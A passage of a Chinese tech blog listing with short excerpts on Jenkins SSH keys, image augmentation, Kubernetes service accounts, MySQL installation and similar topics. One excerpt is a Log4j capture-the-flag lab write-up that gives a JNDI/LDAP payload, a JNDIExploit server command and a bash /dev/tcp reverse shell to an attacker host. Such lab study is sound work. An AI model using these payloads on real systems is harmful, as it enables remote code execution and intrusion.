3. 配置秘钥 使用其他服务器的其他用户名也可登录：此时就要指定在那个目录下去寻找.ssh 文件夹下的秘钥了。因为root用户可以直接使用/ 表示。如下图所示
4.补充 不论在哪台服务器生成都可以，秘钥相当于一把锁对应多个钥匙，只要有公钥的服务器都能与对应私钥的jenkins相连通。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5c4576807d068f681928266a5483111/" rel="bookmark">
			数据增强可视化 transfrom Python中三个图像增强库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		深入浅出Python中三个图像增强库的使用 目录
介绍ImgaugAlbumentationsSOLT结论 介绍 本文中探索三个流行的 Python 图像增强库。
图像分类器通常在训练更多的图像时表现得更好。在图像分类模型中，一个常见的问题是，模型不能正确地对图像进行分类，只是因为它没有针对同一图像的不同方向进行训练。这可以通过向模型提供多种可能的图像方向和转换来克服。
然而，在现实中，收集这些不同的数据可能需要更多的时间、资源和专业知识，而且对公司来说成本可能很高。在这种情况下，图像数据增强是一个流行的选择，通过使用一个或多个增强技术来生成用于训练的各种图像，从而为现有数据集增加多样性。
尽管一些Python库支持多种增强技术，但并不是所有的技术都适合训练模型。用户需要知道哪些增强技术可以帮助生成用于训练模型的实际附加数据。
我们可以使用各种技术来增强图像数据。它可以包括：
使用几何变换（例如翻转、裁剪、旋转、缩放等）增强图像数据。通过使用颜色转换来增强图像数据，例如通过调整亮度、暗度、锐度、饱和度等。通过随机擦除、混合图像等来增强图像数据。 Imgaug Imgaug 是一个开源 python 包，可让你在机器学习实验中增强图像。它适用于各种增强技术。它有一个简单而强大的界面，可以增强图像、地标、边界框、热图和分割图。
让我们首先使用 pip 安装这个库。
pip install imgaug 接下来，我们将使用 pip 命令在命令提示符下安装名为“IPyPlot”的 python 包：
pip install ipyplot IPyPlot 是一个 Python 工具，允许在 Python Notebook 单元格中快速高效地显示图像。这个包将 IPython 与 HTML 相结合，以提供一种更快、更丰富、更具交互性的方式来显示图像。这个包的 'plot_images' 命令将用于以网格状结构绘制所有图像。
此外，我们将导入扩充数据所需的所有必要包。
import imageio import imgaug as ia import imgaug.augmenters as iaa 增强的图像路径在此处定义。我们将使用鸟类图像作为示例。
input_img = imageio.imread('../input/image-bird/bird.jpg') 图像翻转
我们可以使用下面的命令水平和垂直翻转图像。以下代码中的“Fliplr”关键字水平翻转图像。同样，关键字“Flipud”垂直翻转图像。
#Horizontal Flip hflip= iaa.Fliplr(p=1.0) input_hf= hflip.augment_image(input_img) #Vertical Flip vflip= iaa.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b5c4576807d068f681928266a5483111/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b829702e0ef4e99eb2a5272e76812c49/" rel="bookmark">
			Android7.1隐藏底部导航栏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android7.1隐藏底部导航栏 ​
修改文件：PhoneStatusBar.java中的addNavigationBar()方法：
​ frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java
进入操作空间：
​ 1、 cd frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/
​ 2、 sudo gedit PhoneStatusBar.java
​ 3、查找addNavigation()方法
​ 4、注释掉 mWindowManager.addView(mNavigationBarView, getNavigationBarLayoutParams());
​ 5、保存退出编译即可。
​
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46aa31afebba1485af73307d716d43ed/" rel="bookmark">
			log4j漏洞原理和靶场复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一、Log4j的前置知识
1，JNDI接口
2，LDAP协议
3，RMI协议 4,Log4j
二、Log4j漏洞的成因
三、Ctfshow靶场复现
四、Log4j的临时缓解措施
前言 提示：这里可以添加本文要记录的大概内容：
Log4j作为核弹级别的漏洞，影响十分广泛，作为刚入门网络安全的小白，之前对Java的知识很不熟悉，最近接触了一点关于SpringBoot2的微服务开发，对Java有了些许了解。因此，了解了一下Log4j漏洞，做个小小的总结。
提示：以下是本篇文章正文内容，下面案例可供参考
一、Log4j的前置知识 1，JNDI接口 解释：JNDI全称为 Java Naming and Directory Interface，是JAVA命名和目录接口的一种JAVA API，应用通过该接口与具体的目录服务进行交互，允许通过名称发现和查找数据或对象，可用于动态加载配置等。
2，LDAP协议 解释：LDAP称为轻量级目录访问协议，既是一种服务，也是一种协议，是JNDI的一种底层实现，主要功能是提供命名关键字到对象的映射目录，开发人员可以通过输入名称，获取到对象的内容。简单来说，就是搜索功能，它是分布式的，允许从远程服务器上面加载获取对象。
3，RMI协议 解释：JAVA的一种远程接口调用协议，在TCP协议上传递可序列化的Java对象，即可以实现调用远程方法和调用本地方法一样简单。
4,Log4j 解释:Log4j是由Apache提供的日志操作包，用于帮助用户处理日志信息。通过Log4j，可以控制日志信息输送的目的地是控制台、文件、GUI组件、甚至是套接口服务器等各种地方。
二、Log4j漏洞的成因 Log4j为了输出日志时能输出任意位置的Java对象，引入了Lookup接口，这个Lookup接口可以看作是JNDI的一种实现，允许按照具体的名称逻辑查找对象的位置，并输出对象的内容，此对象可以通过Java的序列化或反序列化传输，从远程服务器上查找。
由于Lookup接口的原因，Log4j就暗含JNDI注入漏洞，可以联合使用JNDI+LDAP或者JNDI+RMI通过命名功能直接从远程服务器上调用文件并在本地执行。
Log4j在处理消息转换时，会按照字符检测每条日志，当日志中包含${}时，则会将表达式的内容替换成真实的内容(即lookup接口查找得到的内容），使用LDAP或RMI协议，能从远程服务区上请求恶意的对象，对象在调用的过程中会被解析执行，导致了Log4j的漏洞。
三、Ctfshow靶场复现 1，进入靶场
先使用dnslog 域名解析探测是否存在Log4j漏洞，${jndi:ldap://dns}，通过ldap协议进行域名解析，被记录则存在漏洞。
2，在远程vps上搭建LDAP服务器，并将恶意代码编译并挂在服务器上，对JAVA不太熟练，直接使用JNDIExploit工具进行搭建。
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 12x.7x.2x.17x -p 4444 启用恶意服务
通过bash -i &gt;&amp; /dev/tcp/120.x.7x.2x.17x/5555 0&gt;&amp;1反弹shell
bash -i 指开启一个交互式的Shell
&amp;符号用于区分文件和文件描述符
&gt;&amp;表示标准输出或标准错误输出重定向到文件
0指标准输入重定向，1指标准输出重定向，2指错误输出重定向
/dev/tcp指linux下的特殊设备，可用于建立Socket连接
bash -i &gt;&amp; /dev/tcp/120.x.7x.2x.17x/5555 0&gt;&amp;1 指将标准输出重定向到/dev/tcp/ip/port端口文件中即重定向到攻击机，靶机的标准输入被重定向到了标准输出，标准输出重定向到了攻击机，因此标准输入也就重定向到了攻击机，所以可以看到攻击机输入命令并看到结果。
3，使用nc工具监听端口，接受反弹shell
BASE64编码后+和=进行一次URL编码才能被工具识别 得到flag(工具的payload有很多，可耐心多尝试几个，由于JDK版本等原因，可能一些不行）
注：若是云服务器，切记配置安全组规则，开启端口出入方向的访问，否则跟我一样傻呆呆。
原理：通过Lookup接口+LADP，从服务器请求下载了存在恶意payload的class文件，由于日志检测时，存在${则触发替换机制，导致了表达式被替换成了lookup查找到的恶意payload，在请求过程中被实例化解析执行了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46aa31afebba1485af73307d716d43ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ef62361d2003278c573ec0a0c459850/" rel="bookmark">
			文件的导入与导出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JS的导出分两种方式：
1、export default{}，对应的导入import xxx from xx文件
2、分别导出：
export xxx
export xxxxx
对应导入：import {xx,aa,bb} from 文件
TS的导入导出：
例如：创建 1.ts 做模块导出，2.ts 模块导入
1.ts 导出：
//export { xx,xx,xx }：不用写default也能导出多个
function mapState() {}
function mapMutation() {}
function mapGetters() {}
export { mapGetters, mapState, mapMutation };
2.ts 导入 ：
import { mapGetters, mapMutation, mapState } from “./1”;
mapGetters();
mapMutation();
mapState();
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecf312cfa2e5a1ea6b651d6068562476/" rel="bookmark">
			在做微信公众号网页授权的时候，有时会重定向两次网页（302问题）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在做微信公众平台网页授权时，发现每次请求授权链接
https://open.weixin.qq.com/connect/oauth2/authorize?appid=xxx&amp;redirect_uri=xxx&amp;response_type=code&amp;scope=snsapi_userinfo&amp;state=STATE#wechat_redirect
时都会重定向链接redirect_uri都会自动请求两次，由于并发导致了一些问题，
{"errcode":40001,"errmsg":"invalid credential, access_token is invalid or not latest, hints: [ req_id: PSp.LA0036s182 ]"}
也可能为
"errcode":40163,"errmsg":"codebeenused 微信受权错误："errcode":40163,"errmsg":"codebeenused
那么，为什么会请求两次呢？，调试时发现会访问两次，一次是301，页面重定向了，第二次跟第一次就也是相通的滤镜进行重定向。因为重定向请求了两次，所以会提示code已经被使用。没有获取oppenID，因为还没绑定开放平台。加上后，不再报错。code 可以了。
后来发现只要加个属性就不会有这个问题了。
https://open.weixin.qq.com/connect/oauth2/authorize?appid=xxx&amp;redirect_uri=xxx&amp;response_type=code&amp;scope=snsapi_userinfo&amp;state=STATE&amp;connect_redirect=1#wechat_redirect
&amp;connect_redirect=1 这个参数非常重要!!!!!!
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9de4d78a7c5a32492027fb7f02341ce8/" rel="bookmark">
			k8s之service account
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		service account是k8s为pod内部的进程访问apiserver创建的一种用户。其实在pod外部也可以通过sa的token和证书访问apiserver，不过在pod外部一般都是采用client 证书的方式。
创建一个namespace，就会自动生成名字为 default 的 service account。
root@master:~# kubectl create ns test namespace/test created root@master:~# kubectl get sa -n test NAME SECRETS AGE default 1 6s 当然我们也可以再创建额外的sa。
root@master:~# kubectl create sa sa1 -n test serviceaccount/sa1 created root@master:~# kubectl get sa -n test NAME SECRETS AGE default 1 94s sa1 1 2s 有了sa后，我们就可以使用sa的token和apiserver交互了，由于所有通信都通过TLS进行，所以也得需要证书（ca.crt，这里的证书指的是server端的ca证书）或者允许不安全的连接(--insecure)。
token和证书如何获取的？每个sa都会自动关联一个secret，token和证书就存在secret中。在pod内部他们被放在如下文件中(所有pod内部的ca.crt证书都一样，都是/etc/kubernetes/pki/ca.crt)
/var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 在外部可以通过secret获取。下面分别实验这两种方式下如何访问apiserver。
root@master:~# kubectl describe sa sa1 -n test Name: sa1 Namespace: test Labels: &lt;none&gt; Annotations: &lt;none&gt; Image pull secrets: &lt;none&gt; Mountable secrets: sa1-token-p5wxt Tokens: sa1-token-p5wxt Events: &lt;none&gt; 外部访问apiserver 下面验证在外部如何通过sa的token和证书访问apiserver。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9de4d78a7c5a32492027fb7f02341ce8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f05af0a0eb2eff5404084289c1652a21/" rel="bookmark">
			flink实时数仓 向hbase建立维度表跟添加数据 scala方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		=============HBase================== package functions import java.util import com.alibaba.fastjson.{JSON, JSONObject} import entity.TableProcess import org.apache.flink.configuration.Configuration import org.apache.flink.streaming.api.functions.sink.{RichSinkFunction, SinkFunction} import org.apache.hadoop.hbase.{HColumnDescriptor, HTableDescriptor, TableName} import org.apache.hadoop.hbase.client.{Admin, Connection, Put, Scan, Table} import utils.{HbaseUtil, MyMysqlUtils} class MyHbaseSink extends RichSinkFunction[JSONObject] { //初始化连接 var con: Connection = _ var table: Table = _ var admin:Admin=_ var sink_table:String=_ //用于在内存中存放配置表信息的Map &lt;表名：操作,tableProcess&gt; var map: util.HashMap[String, TableProcess] = new util.HashMap[String, TableProcess]() //定义一个空put var put:Put=null //初始化 override def open(parameters: Configuration): Unit = { con=HbaseUtil.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f05af0a0eb2eff5404084289c1652a21/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/984bb2e43baadfea1537c4fa79d9a28f/" rel="bookmark">
			负载均衡的OJ系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1 项目展示2 项目基本结构3 CompilerServer模块设计3.1 整体结构设计#添加日志功能获取日期时间格式的时间戳 3.2 compiler编译模块#路径工具类 3.3 run运行模块#添加资源限制功能 3.4 compliler_run模块3.4.1 定义结构3.4.2 功能模块的编写3.4.2.1 获取唯一性的文件名3.4.2.2 读写文件操作3.4.2.3 清理临时文件3.4.2.4 获得状态码含义 3.4.3 compiler_run模块的整体代码3.4.4 编译运行模块的整体测试 3.5.compiler_server模块 4 OJServer模块设计4.1 整体结构设计4.2 oj_server模块4.3.oj_model模块4.3.1 整体接口的设计4.3.2 文件版本题库4.3.2.1 题库设计4.3.2.2 oj_model_fd模块4.3.2.2.1 整体结构的设计4.3.2.2.2 字符串切分功能4.3.2.2.3 整体代码的编写 4.3.3 数据库版本题库4.3.3.1 题库设计4.3.3.2 oj_model-db模块 4.4 oj_view模块4.5 oj_control模块4.5.1 整体结构设计4.5.2 构建题目列表和单个题目网页4.5.3 判题功能4.5.3.1 负载均衡模块4.5.3.1.1 整体功能设计4.5.3.1.2 负载均衡模块的实现 4.5.3.2 判题模块的编写 4.5.4 更新主机上线状态 5. 前端页面设计5.1首页5.2题目列表页面5.3指定题目的编写提交页面 6 顶层项目部署Makefile7 项目组件的安装与使用jsoncppcpp-httplibboost库ctemplateMySQL workbenchmysql-connector-c 1 项目展示 启动服务之后，首先访问首页会得到首页界面
点击两个箭头指向的任意地方都可以打开题库
因为我的数据库只录了一道题，所以只显示了一道，后面可以自己再继续录题，最终的题目会根据编号排好序在列表里展示出来，点击题目标题就可以跳转到题目的编辑页面
编辑页面左侧有题目的介绍，右侧是代码编辑区，里面已经预置了一部分代码，用户可以直接在给定的函数里面编写，完成题目要求的函数功能。编辑完成后可以点击保存并提交，会把代码提交到后端进行编译，然后把结果返回，无论是代码编译错误还是运行错误，亦或是超时或者内存超出限制，都会把对应的结果与原因展示在网页的下面。
需要用到的技术栈：C++ STL、boost库的字符串分割，cpp-httplib第三方开源网络库，ctemplate第三方开源前端网页渲染库、jsoncpp序列化反序列化，负载均衡的设计算法，MySQL C语言连接数据库。
开发环境：centos 7云服务器，vscode
项目源码：https://gitee.com/tie-zhuTX/LoadBalancedOJ
2 项目基本结构 项目整体分为三大模块：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/984bb2e43baadfea1537c4fa79d9a28f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aaed9cc7ad2f266a20e65c205e087d14/" rel="bookmark">
			Elasticsearch写入性能、搜索速度调优
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、写入性能调优
增加flush时间间隔，目的是减小数据写入磁盘的频率，减小磁盘IO
增加refresh_interval的参数值，目的是减少segment文件的创建，减少segment的merge次数，merge是发生在jvm中的，有可能导致full GC，增加refresh会降低搜索的实时性。
增加Buffer大小，本质也是减小refresh的时间间隔，因为导致segment文件创建的原因不仅有时间阈值，还有buffer空间大小，写满了也会创建。 默认最小值 48MB&lt; 默认值 堆空间的10% &lt; 默认最大无限制
大批量的数据写入尽量控制在低检索请求的时间段，大批量的写入请求越集中越好。
详情请参考：http://www.ysxbohui.com/article/46
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/876d599e73134a1bd9939619b0d6fb2f/" rel="bookmark">
			实现Windows11深色主题自由切换再也不是梦~
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Windows 系统的深色主题已经出了很长一段时间了，除了个别软件不能跟随系统主题切换，不少软件都能体验到深色主题。
但遗憾的是，Windows 系统的深色主题是不能自动切换的，如果想用只能手动去设置里面搞，非常麻烦。对比一下隔壁 macOS，微软这个设计着实不友好。
DarkMode
一款可以自动切换深浅主题的免费小工具：DarkMode。
可以自己设置浅色模式开始结束时间，或是根据定位判断日出日落时间，自动帮你调节。
除了 Windows 和应用的深浅模式设置，还支持壁纸跟随切换，不仅是纯图片，也提供了对 Wallpaper Engine 的支持，非常好用。
感兴趣的朋友可以去 Gitee 下载体验，运行 DarkMode 时注意使用「管理员身份运行」避免出错。开机自启几乎不用管。
https://gitee.com/melon_studio/darkmode/releases
Auto Dark Mode
除了前款，想要实现深色模式自动切换，Auto Dark Mode 这款软件也是一个选择。
同样支持自定义切换时间、获取日出日落时间，不过比前面那款软件多了一个自定义地理坐标的功能。
Auto Dark Mode 的场景切换也很实用，在玩游戏、使用电池供电等场景，为你提供更多选择。
除了设置系统界面和应用程序，对于 Office 主题还可以单独设置，考虑的比较全面。
同样支持壁纸切换，遗憾的是仅支持壁纸图片，Wallpaper Engine 用户可能要考虑用第一款软件了。
https://apps.microsoft.com/store/detail/auto-dark-mode/XP8JK4HZBVF435
如果你还没安装操作系统，可点击下方查看
Windows 11 家庭版/专业版 操作系统软件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a35f647378051f46f2b68f35c41c248/" rel="bookmark">
			springboot使用yml格式报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Error creating bean with name 'helloWorldController': Injection of autowired dependencies failed; nested exception is java.lang.IllegalArgumentException: Could not resolve placeholder 'user2' in value "${user2}"
需要加上注释
@PropertySource(value = "classpath:application.yml") 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87151fffb059b74db7a76633719eb3bc/" rel="bookmark">
			Linux CentOS 7 安装mysql的两种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前提条件
一、通过官网下载tar压缩包或rpm安装包来安装。
二、通过yum的方式安装
三、安装完后，启动mysql
前提条件 1、查看是否安装了mysql服务（有则自行卸载删除）。
yum list installed mysql* rpm –qa|grep mysql* 一、通过官网下载tar压缩包或rpm安装包来安装。 1、确定服务器的基础框架是arm架构还是x86架构。
uname -m 执行示例：
2、确定出你需要的系统版本。
以我的为例，是CentOS 7系统。（CentOS 版本是基于Red Hat 版本开发的）
cat /etc/redhat-release 执行示例：
3、打开mysql官网下载地址。
MySQL :: Download MySQL Community Server
4、选择对应的选项进行下载。
示例（注意红色箭头标记的关键字）：
5、通过WinSCP、XFTP上传等工具上传服务器并解压。
①、创建jdk安装路径 mkdir /usr/local/mysql ②、上传压缩包到任意路径，解压
tar -zxvf 安装包 -C 指定目录 然后得到若干rpm包。
6、删除原有的mariadb，否则可能会报异常。
①、先查看一下是否已经安装了，
rpm -qa|grep mariadb ②、删除mariadb。
rpm -e --nodeps mariadb-libs 7、安装rmp包
逐个安装，命令如下：
【必须安装】
rpm -ivh mysql-community-common-8.0.26-1.el8.x86_64.rpm
rpm -ivh mysql-community-libs-8.0.26-1.el8.x86_64.rpm
rpm -ivh mysql-community-client-8.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87151fffb059b74db7a76633719eb3bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a421a7fbc0376b5c2984ac8daaac59b/" rel="bookmark">
			notepad&#43;&#43;配置Python环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基本设置：
（1）视图：自动换行 和 显示空格和制表符 （2）设置--首选项---语言 ： 将制表符自动替换为四个空格 （3）设置--首选项---自动完成 ：将自动输入里面的几个选项选上 （4）运行---运行 设置命令 （ 更推荐使用nppexec插件，参考最后面的插件介绍） 在弹出的窗口里填入：cmd /k cd "$(CURRENT_DIRECTORY)" &amp; python "$(FULL_CURRENT_PATH)" &amp; ECHO. &amp; PAUSE &amp; EXIT；
cmd /k python： 表示打开Cmd窗口，运行/k后边的命令，并且执行完毕后保留窗口。此处即python（因为在环境变量里已经添加了Python目录，所以这里不用指定Python程序的目录，就可直接找到）
$(CURRENT_DIRECTORY) ：Notepad++的宏定义，表示当前文件所在目录。
$(FULL_CURRENT_PATH) ：Notepad++的宏定义，表示当前文件的绝对路径。
&amp; 用来连接多条命令
ECHO：换行
PAUSE： 表示运行结束后暂停（cmd中显示“请按任意键继续. . .”），等待一个按键继续
EXIT： 表示“按任意键继续. . .”后，关闭命令行窗口。
如果运行成功点击保存，填入这个命令的名称（随意取）：Run Python；
定义这个命令的快捷键（注意不要和已有的快捷键冲突），保存即可。然后再选择”运行“，发现多出了”Run Python“这一项。
注意：
（5）新建文件建议都用 UTF-8 无BOM格式 设置---首选项---新建---编码
Notepad++中，关于utf-8的编码格式，有两种：以UTF-8无BOM格式编码和以UTF-8格式编码。很容易给人一种错觉，第一反应会选择以UTF-8格式编码，感觉这种就是平时所说的UTF-8，然而这种编码是默认带BOM的，就是文件头上多了个特殊的标记。BOM格式（Byte Order Mark）是微软特有的，其实UTF-8 的BOM对UFT-8没有作用,是为了支持UTF-16,UTF-32才加上的。
如果在Notepad++中选择以UTF-8格式编码，如果一直在windows下，其实也没有什么问题，但是一旦到了其他环境，就可能是乱码，尤其是linux环境，还有Mac本的unix环境。
（6）常用插件：
1，explorer：方便文件或代码存储管理
2，compare：比较文件或代码差异
3，quicktext：方便快速输入一些重复性代码或文字用
4，python script：多功能代码插件
5，nppexec插件：可以实现自动调试和输出监视功能
子菜单运行中输入,并保存为pythonrun
npp_save cd "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a421a7fbc0376b5c2984ac8daaac59b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7971cb31e433e0628455887f83498c1/" rel="bookmark">
			Unity PC打包后日志查看
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		日志文件路径：
C:\user\userName\AppData\LocalLowcompanyName\productionName\player_prev.log
编辑器日志输出文件路径：
C:\user\userName\AppData\LocalLowcompanyName\productionName\player.log
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96996b456811da4ebffd346540d92f92/" rel="bookmark">
			img的title和alt区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 相同点：
都是img的属性 不同点：
1.title是鼠标滑动到元素上时的显示； 2.alt是img的特有属性，是图片无法正常显示时的提示； 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8280f01f8ffada0a49f785062d107bc4/" rel="bookmark">
			css 边框流动效果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通过伪元素及动画实现，复制即可食用
&lt;div class="txbox"&gt;border&lt;/div&gt; .txbox { height: 200px; border: 1px solid #000; border-radius: 10px; position: relative; text-align: center; line-height: 200px; z-index: 1; overflow: hidden; background: #000; } .txbox::before { content: ""; display: block; position: absolute; width: 60%; height: 60%; left: 50%; top: 50%; background: #fff; z-index: -2; transform-origin: 0 0; animation: rotate 3s infinite linear; } @keyframes rotate { to { transform: rotate(1turn); } // 0% {background: red;left: 0px;top: 0px;} // 25% {background: yellow;left: 200px;top: 0px; } // 50% {background: skyblue;left: 200px;top: 200px;} // 75% {background: green;left: 0px;top: 200px; } // 100% {background: #fff;left: 0px;top: 0px;} } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8280f01f8ffada0a49f785062d107bc4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1755a54bf5ce1578d6264c8689dbcc19/" rel="bookmark">
			MyBatisPlus（四、代码生成器）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：大三的土狗
专栏：MyBatis-Plus
目录 一、旧版本1、添加模板引擎依赖2、添加generator依赖3、编写生成器代码1、配置 GlobalConfig2、DataSourceConfig 4、效果 二、新版本1、导入依赖2、快速生成3、交互式生成4、配置1、DataSourceConfig2、GlobalConfig3、PackageConfig4、TemplateConfig5、InjectionConfig 一、旧版本 注意
适用版本：mybatis-plus-generator 3.5.1 以下版本
AutoGenerator 是 MyBatis-Plus 的代码生成器，通过 AutoGenerator 可以快速根据数据表自动生成实体类、Mapper、Service、ServiceImpl、Controller等各个模块的代码，极大的提升了开发效率。
1、添加模板引擎依赖 添加 模板引擎 依赖，MyBatis-Plus 支持 Velocity（默认）、Freemarker、Beetl，用户可以选择自己熟悉的模板引擎，如果都不满足您的要求，可以采用自定义模板引擎。
Velocity（默认）：
&lt;dependency&gt; &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt; &lt;artifactId&gt;velocity-engine-core&lt;/artifactId&gt; &lt;version&gt;最新版本&lt;/version&gt; &lt;/dependency&gt; Freemarker：
&lt;dependency&gt; &lt;groupId&gt;org.freemarker&lt;/groupId&gt; &lt;artifactId&gt;freemarker&lt;/artifactId&gt; &lt;version&gt;最新版本&lt;/version&gt; &lt;/dependency&gt; Beetl：
&lt;dependency&gt; &lt;groupId&gt;com.ibeetl&lt;/groupId&gt; &lt;artifactId&gt;beetl&lt;/artifactId&gt; &lt;version&gt;最新版本&lt;/version&gt; &lt;/dependency&gt; 我们选用默认的
2、添加generator依赖 在 pom.xml 导入 MyBatis Plus Generator 的依赖
&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt; &lt;version&gt;3.3.1.tmp&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt; &lt;artifactId&gt;velocity&lt;/artifactId&gt; &lt;version&gt;1.7&lt;/version&gt; &lt;/dependency&gt; 3、编写生成器代码 1、配置 GlobalConfig 这里是生成的位置作者
GlobalConfig globalConfig = new GlobalConfig(); globalConfig.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1755a54bf5ce1578d6264c8689dbcc19/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e96e63fb40160eefe6e677f1c2608cd5/" rel="bookmark">
			extjs .net core开发的私有网盘管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分为个人网盘、部门网盘、公共网盘，支持文档、图片、视频在线预览、播放，
完善的权限控制，支持用户存储配额管理
1、个人网盘：存储个人文件
2、部门网盘：存储部门文件，部门内用户可以查看、下载，部门管理员可以上传、删除及维护。
3、公共网盘：存储公共文件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbf1c8e1b0e2992b5beb59fa3eeae227/" rel="bookmark">
			牛客网——扫雷
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​
​
活动地址：CSDN21天学习挑战赛
学习的最大理由是想摆脱平庸，早一天就多一份人生的精彩；迟一天就多一天平庸的困扰。各位小伙伴，如果您：
想系统/深入学习某技术知识点…
一个人摸索学习很难坚持，想组团高效学习…
想写博客但无从下手，急需写作干货注入能量…
热爱写作，愿意让自己成为更好的人…
…
欢迎参与CSDN学习挑战赛，成为更好的自己，请参考活动中各位优质专栏博主的免费高质量专栏资源（这部分优质资源是活动限时免费开放喔~），按照自身的学习领域和学习进度学习并记录自己的学习过程。您可以从以下3个方面任选其一着手（不强制），或者按照自己的理解发布专栏学习作品，参考如下：
**
目录
前言
一、扫雷
描述
输入描述：
输出描述：
二、分析问题
三、解决问题
总结
前言 今天咱们一起学习一下怎么扫雷。
一、扫雷 题目来源：
扫雷_牛客题霸_牛客网
描述 小sun上课的时候非常喜欢玩扫雷。他现小sun有一个初始的雷矩阵，他希望你帮他生成一个扫雷矩阵。
扫雷矩阵的每一行每一列都是一个数字，每个数字的含义是与当前位置相邻的8个方向中，有多少个雷（在下图中，雷用*表示）；如果当前位置就是雷的话，仍输出一个*。
比如初始的雷矩阵如下：
....
..**
*.*.
.*.*
对应的数字矩阵为：
0122
13**
*4*4
2*3*
输入描述： 第一行两个整数n,m，代表矩阵有n行m列
接下来共n行，每行m个字符
输出描述： 输出共n行m列，为扫雷矩阵。
二、分析问题 规则：一定要明白扫雷的规则，就是一个数字表示它自身周围的八个格子有它数字相应数量的雷
那么我们要按题目完成任务就要使用防御编程，发现一个*（雷），整圈+1。
但是我们也要注意，因为*周边一圈里可能也有*，所以它是不能够加一的，要解决这个就要用到换元的思想了，把*=1。
三、解决问题 代码如下：
#include&lt;stdio.h&gt; int main() { int arr[1000][1000] = {0}, n, m; char input; scanf("%d %d", &amp;n, &amp;m); for (int i = 1; i &lt;= n; i++) { getchar(); for (int j = 1; j &lt;= m; j++) { scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbf1c8e1b0e2992b5beb59fa3eeae227/">Read more…</a>
	</div>
